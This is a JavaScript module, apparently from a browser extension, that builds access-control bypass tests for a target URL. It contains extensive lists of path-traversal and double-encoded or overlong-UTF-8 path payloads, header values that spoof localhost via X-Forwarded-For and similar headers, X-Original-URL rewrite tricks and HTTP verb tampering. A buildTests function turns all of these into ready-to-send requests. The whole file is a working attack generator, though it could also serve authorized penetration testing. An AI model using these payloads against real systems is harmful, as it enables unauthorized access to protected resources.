// techniques.js
// Bypass technique payloads + test builder. Shared by the background worker.
//
// BROWSER LIMITATION (see README): fetch() runs URLs through the browser URL
// parser, which normalizes literal dot-segments ("..", "."), converts "\" to
// "/" and strips fragments BEFORE the request is sent. Percent-encoded octets
// (%2e, %2f, %252e, %c0%af, ...) ARE preserved and reach the wire unchanged,
// so the encoded techniques + all header/method techniques are the effective
// ones here. Each test is tagged `normalized: true` when the browser is likely
// to rewrite it, so the UI can warn the operator.

/* ------------------------------------------------------------------ *
 * PATH MANIPULATION (GET) — {0} = target path (no leading slash)      *
 * ------------------------------------------------------------------ */
export const PATH_MANIPULATION_TECHNIQUES = dedupSort([
  // --- original set ---
  "{0}", "%2e/{0}", "%2f{0}/", "%2f{0}%2f", "./{0}/",
  "{0}/.", "/{0}/./", "/{0}//", "./{0}/./",
  "{0}?", "{0}.html", "{0}.php", "{0}#",
  "{0}..;/", "{0};/", "//{0}///",
  "*{0}/", "/{0}", "/{0}//",
  "{0}../", "{0}/*", ";/{0}/", "/;//{0}/",
  "{0}%00", "{0}.",
  "{0}..%2f", "{0}%20", "{0}%09", "{0}.json", "{0}.xml",
  "{0}%23", "{0}%3f", "{0}%26", "{0}%2e",
  "{0}..%00/", "{0}..%0d/", "{0}..%5c", "{0}..\\", "{0}..%ff/",
  "{0}%2e%2e%2f", "{0}.%2e/",
  "{0}??", "{0}???",
  "{0}/.randomstring", "{0}%20/", "{0}%20assets%20/",
  "{0}\\..\\.\\", "{0}/./", "{0}/*/",
  "{0}/..;/", "{0}%2e/assets", "{0}/%2e/", "{0}//.", "{0}////",
  "{0};assets/",
  "{0}%c0%af", "{0}%e0%80%af",
  "{0}%0d", "{0}%0a", "{0}%0d%0a",
  "{0}::$DATA",
  "..;/{0}", "/..;/{0}", "..%00/{0}",
  "{0}%a0", "{0}%85", "{0}%c2%a0",
  "a/..%5c{0}", "x/..%5c{0}", "junk/..%5c{0}",
  "a/..\\{0}", "a/../{0}",
  "#/../{0}", "%23/../{0}", "#/{0}", "%23/{0}",

  // --- NEW: trailing slash / segment tricks ---
  "{0}/", "{0}//", "{0}/./", "{0}/.//",
  "{0};", "{0};/", "{0};foo=bar", "{0}/;/", "{0}/.;/",
  ".;/{0}", "{0}%2f", "%2e%2f{0}",

  // --- NEW: double URL-encoding (proxy decodes once, backend again) ---
  "{0}%252e", "{0}%252f", "%252e/{0}", "%252f{0}", "{0}..%252f",
  "{0}%252e%252e%252f", "%252e%252e%252f{0}",

  // --- NEW: Unicode / fullwidth / overlong UTF-8 dot & slash ---
  "{0}%ef%bc%8f",            // fullwidth solidus ／
  "%ef%bc%8f{0}",
  "{0}%ef%bc%8e",            // fullwidth full stop ．
  "{0}%e2%88%95",            // division slash ∕
  "{0}%e2%81%84",            // fraction slash ⁄
  "{0}%c0%ae%c0%ae%2f",      // overlong dots
  "{0}%f0%80%80%af",         // 4-byte overlong slash
  "{0}%f8%80%80%80%af",      // 5-byte overlong slash
  "{0}%uff0e", "{0}%u2215",  // %u encoding (IIS)

  // --- NEW: nested traversal to parent then back (encoded) ---
  "{0}%2e%2e%2f{0}", "..%2f..%2f{0}", "{0}%2f..%2f",
  "%2f%2e%2e{0}",
]);

/* ------------------------------------------------------------------ *
 * ENCODING TEMPLATES (GET) — {0} = target path (no leading slash)     *
 * ------------------------------------------------------------------ */
export const ENCODING_TEMPLATES = dedupSort([
  "{0}%20", "{0}%09", "{0}%00", "{0}%0d", "{0}%0a",
  "%2e/{0}", "%2f%2f{0}", "%2f{0}", "{0}%2f",
  "{0};", "{0};/", "{0};x", "{0};x/",
  "..;/{0}", "{0}/..;/",
  "{0}%2e", "{0}%2e%2e", "{0}%2e%2e%2f",
  "{0}/.", "{0}//", "{0}///",
  "%2e/{0}/", "/{0}/.", "/{0}//", "//{0}",
  "{0}%c0%af", "{0}%e0%80%af",
  "{0}%a0", "{0}%85", "{0}%c2%a0",
  // NEW
  "{0}%252e", "{0}%252f", "{0}%2500",
  "{0}%25%32%65", "{0}%25%32%66",     // fully-encoded %2e / %2f
  "{0}%09%09", "{0}%20%20",
]);

/* ------------------------------------------------------------------ *
 * PARAMETER TECHNIQUES — suffix appended to the full path (GET)       *
 * ------------------------------------------------------------------ */
export const PARAMETER_TECHNIQUES = dedupSort([
  "?", "??", "???", "?#",
  "?%23", "?%3f", "?%26", "?%20", "?%09",
  "?..", "?../", "?..%2f", "?..%00/", "?..%0d/",
  "?..%5c", "?..\\", "?..%ff/",
  "?%2e%2e%2f", "?.%2e/", "?%2e",
  "?/.", "?/.randomstring", "?.html", "?.json",
  "?%20/", "?%20assets%20/",
  "?\\..\\.\\", "?/*", "?/./", "?/*/",
  "?/..;/", "?%2e/assets", "?/%2e/", "?//.", "?////", "?;assets/",
]);

/* ------------------------------------------------------------------ *
 * HTTP METHODS                                                        *
 * (CONNECT/TRACE are blocked by the browser; TRACK usually errors —   *
 *  they still show up as "error" which is itself informative.)        *
 * ------------------------------------------------------------------ */
export const HTTP_METHODS = dedupSort([
  "GET", "POST", "PUT", "PATCH", "DELETE",
  "HEAD", "OPTIONS",
  "DEBUG", "TRACK",
  // NEW: WebDAV / cache verbs often not covered by ACLs
  "PROPFIND", "PURGE", "CONNECT", "TRACE",
]);

/* ------------------------------------------------------------------ *
 * BYPASS HEADERS (GET on original URL)                                *
 *  {domain} -> host   {target} -> full URL   {path} -> path no-slash  *
 * ------------------------------------------------------------------ */
export const BYPASS_HEADERS = [
  { "X-Forwarded-For": "127.0.0.1" },
  { "X-Originating-IP": "127.0.0.1" },
  { "X-Real-IP": "127.0.0.1" },
  { "X-Remote-IP": "127.0.0.1" },
  { "X-Remote-Addr": "127.0.0.1" },
  { "X-ProxyUser-Ip": "127.0.0.1" },
  { "Host": "localhost" },
  { "X-Originally-Forwarded-For": "127.0.0.1" },
  { "From": "127.0.0.1" },
  { "Profile": "http://{domain}" },
  { "X-Arbitrary": "http://{domain}" },
  { "X-HTTP-DestinationURL": "http://{domain}" },
  { "X-Forwarded-Proto": "http://{domain}" },
  { "Destination": "127.0.0.1" },
  { "Proxy": "127.0.0.1" },
  { "CF-Connecting-IP": "127.0.0.1" },
  { "True-Client-IP": "127.0.0.1" },
  { "Base-Url": "127.0.0.1" },
  { "Client-IP": "127.0.0.1" },
  { "Http-Url": "127.0.0.1" },
  { "Proxy-Host": "127.0.0.1" },
  { "Proxy-Url": "127.0.0.1" },
  { "Real-Ip": "127.0.0.1" },
  { "Redirect": "127.0.0.1" },
  { "Referrer": "127.0.0.1" },
  { "Request-Uri": "127.0.0.1" },
  { "Uri": "127.0.0.1" },
  { "Url": "127.0.0.1" },
  { "X-Forward-For": "127.0.0.1" },
  { "X-Forwarded-By": "127.0.0.1" },
  { "X-Forwarded-Server": "127.0.0.1" },
  { "X-Forwarded": "127.0.0.1" },
  { "X-Forwarder-For": "127.0.0.1" },
  { "X-Http-Host-Override": "127.0.0.1" },
  { "X-Original-Remote-Addr": "127.0.0.1" },
  { "X-Proxy-Url": "127.0.0.1" },
  { "X-Forwarded-Scheme": "http" },
  { "Referer": "{target}" },
  { "Origin": "{target}" },
  { "X-Requested-With": "XMLHttpRequest" },
  { "X-Custom-IP-Authorization": "127.0.0.1" },
  { "X-HTTP-Method-Override": "GET" },
  { "X-HTTP-Method": "GET" },
  { "X-Method-Override": "GET" },
  { "X-Forwarded-Path": "/{path}" },
  { "X-Override-URL": "/{path}" },

  // --- NEW: host / proxy identity spoofing ---
  { "X-Forwarded-Host": "127.0.0.1" },
  { "X-Host": "127.0.0.1" },
  { "X-Original-Host": "{domain}" },
  { "X-Forwarded-Prefix": "/" },
  { "X-Forwarded-Ssl": "on" },
  { "X-Server-IP": "127.0.0.1" },
  { "X-True-IP": "127.0.0.1" },
  { "X-Cluster-Client-IP": "127.0.0.1" },
  { "Fastly-Client-IP": "127.0.0.1" },
  { "X-Azure-ClientIP": "127.0.0.1" },
  { "X-AppEngine-Trusted-IP-Request": "1" },
  { "X-WAP-Profile": "127.0.0.1" },
  { "Content-Length": "0" },
];

// Header names that get the multi-encoding localhost value expansion below.
const IP_SPOOF_HEADERS = ["X-Forwarded-For", "X-Real-IP", "Client-IP", "True-Client-IP"];
// Alternative localhost encodings that frequently defeat naive allow-lists.
const IP_SPOOF_VALUES = ["localhost", "0.0.0.0", "::1", "2130706433", "127.1", "0x7f000001", "127.0.0.1, 127.0.0.1"];

/* ------------------------------------------------------------------ *
 * URL-REWRITE HEADERS — request an ALLOWED path but ask the backend   *
 * to serve the forbidden one. Classic IIS / Symfony / Nginx bypass.   *
 * ------------------------------------------------------------------ */
const REWRITE_HEADERS = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL", "X-Original-Url"];

const FORBIDDEN_FETCH_HEADERS = new Set(["host", "origin", "referer"]);

/* ------------------------------- helpers ------------------------------- */
function looksNormalized(rawPathAndQuery) {
  if (rawPathAndQuery.includes("#")) return true;
  if (rawPathAndQuery.includes("\\")) return true;
  if (/(^|\/)\.\.?(\/|$)/.test(rawPathAndQuery)) return true;
  return false;
}
function applyTemplate(template, pathNoSlash) {
  return template.split("{0}").join(pathNoSlash);
}
function substituteHeader(value, ctx) {
  return value
    .split("{domain}").join(ctx.domain)
    .split("{target}").join(ctx.target)
    .split("{path}").join(ctx.pathNoSlash);
}
function caseVariants(pathname) {
  const out = new Set();
  out.add(pathname.toUpperCase());
  out.add(pathname.toLowerCase());
  const segs = pathname.split("/");
  const i = segs.length - 1;
  const last = segs[i];
  if (last) {
    segs[i] = last.charAt(0).toUpperCase() + last.slice(1);
    out.add(segs.join("/"));
    segs[i] = last.toUpperCase();
    out.add(segs.join("/"));
  }
  out.delete(pathname); // drop the no-op identical to baseline
  return [...out];
}

/**
 * Build the ordered list of tests for a target URL.
 */
export function buildTests(targetUrl, opts = {}) {
  const url = new URL(targetUrl);
  const origin = url.origin;
  const pathname = url.pathname || "/";
  const search = url.search || "";
  const pathNoSlash = pathname.replace(/^\/+/, "");
  const baseFull = origin + pathname + search;
  const ctx = { domain: url.host, target: url.href, pathNoSlash };

  const tests = [];
  const seen = new Set();
  const push = (t) => {
    if (seen.has(t.signature)) return;
    seen.add(t.signature);
    t.id = tests.length + 1;
    tests.push(t);
  };

  const want = (k) => opts[k] !== false;

  // ---- Path manipulation ----
  if (want("path")) {
    for (const tpl of PATH_MANIPULATION_TECHNIQUES) {
      const rawPQ = "/" + applyTemplate(tpl, pathNoSlash);
      const full = origin + rawPQ;
      push({ category: "path", label: tpl, method: "GET", url: full,
        normalized: looksNormalized(rawPQ), signature: "GET|" + full });
    }
  }

  // ---- Encoding ----
  if (want("encoding")) {
    for (const tpl of ENCODING_TEMPLATES) {
      const rawPQ = "/" + applyTemplate(tpl, pathNoSlash);
      const full = origin + rawPQ;
      push({ category: "encoding", label: tpl, method: "GET", url: full,
        normalized: looksNormalized(rawPQ), signature: "GET|" + full });
    }
  }

  // ---- Case permutation ----
  if (want("path") && pathNoSlash) {
    for (const variant of caseVariants(pathname)) {
      const full = origin + variant + search;
      push({ category: "case", label: variant, method: "GET", url: full,
        normalized: false, signature: "GET|" + full });
    }
  }

  // ---- Parameter suffixes ----
  if (want("param")) {
    for (const suffix of PARAMETER_TECHNIQUES) {
      const rawPQ = pathname + suffix;
      const full = origin + rawPQ;
      push({ category: "param", label: suffix, method: "GET", url: full,
        normalized: looksNormalized(rawPQ), signature: "GET|" + full });
    }
  }

  // ---- Header injection ----
  if (want("headers")) {
    for (const obj of BYPASS_HEADERS) {
      const header = Object.keys(obj)[0];
      const value = substituteHeader(obj[header], ctx);
      const useRule = FORBIDDEN_FETCH_HEADERS.has(header.toLowerCase());
      push({ category: "header", label: `${header}: ${value}`, method: "GET",
        url: baseFull, header, headerValue: value, useHeaderRule: useRule,
        signature: `HDR|${header}:${value}` });
    }
    // IP-spoof value expansion for the most impactful headers.
    for (const header of IP_SPOOF_HEADERS) {
      for (const value of IP_SPOOF_VALUES) {
        push({ category: "header", label: `${header}: ${value}`, method: "GET",
          url: baseFull, header, headerValue: value, useHeaderRule: false,
          signature: `HDR|${header}:${value}` });
      }
    }
  }

  // ---- URL-rewrite headers (request root, point header at forbidden path) ----
  if (want("headers")) {
    const rootUrl = origin + "/";
    const rewriteTarget = pathname + search;
    for (const header of REWRITE_HEADERS) {
      // Variant A: hit the site root, rewrite to the forbidden path.
      push({ category: "rewrite", label: `${header}: ${rewriteTarget}  (via /)`,
        method: "GET", url: rootUrl, header, headerValue: rewriteTarget,
        useHeaderRule: false, signature: `RW|/|${header}:${rewriteTarget}` });
      // Variant B: hit the forbidden path, rewrite it to itself (some stacks
      // only consult the header for routing after the ACL check).
      push({ category: "rewrite", label: `${header}: ${rewriteTarget}  (via self)`,
        method: "GET", url: baseFull, header, headerValue: rewriteTarget,
        useHeaderRule: false, signature: `RW|self|${header}:${rewriteTarget}` });
    }
  }

  // ---- HTTP methods ----
  if (want("methods")) {
    for (const method of HTTP_METHODS) {
      push({ category: "method", label: method, method, url: baseFull,
        signature: `M|${method}|${baseFull}` });
    }
  }

  return { baseline: { method: "GET", url: baseFull }, tests };
}

function dedupSort(arr) {
  return Array.from(new Set(arr)).sort();
}
